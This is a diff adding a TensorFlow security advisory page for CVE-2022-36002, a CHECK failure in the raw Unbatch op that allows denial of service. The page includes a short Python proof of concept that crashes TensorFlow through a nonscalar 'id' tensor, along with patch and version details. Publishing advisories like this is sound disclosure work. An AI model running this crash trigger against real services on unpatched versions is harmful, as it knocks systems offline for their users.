@@ -1,0 +1,23 @@
+<h2>TFSA-2022-134: <code>CHECK</code> fail in <code>Unbatch</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-36002</p>
+<h3>Impact</h3>
+<p>When <code>Unbatch</code> receives a nonscalar input <code>id</code>, it gives a <code>CHECK</code> fail that can trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+import numpy as np
+arg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)
+arg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)
+arg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)
+arg_3=47
+arg_4=''
+arg_5=''
+tf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, 
+                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f">4419d10d576adefa36b0e0a9425d2569f7c0189f</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by 刘力源, Information System &amp; Security and Countermeasures Experiments Center, Beijing Institute of Technology.</p>
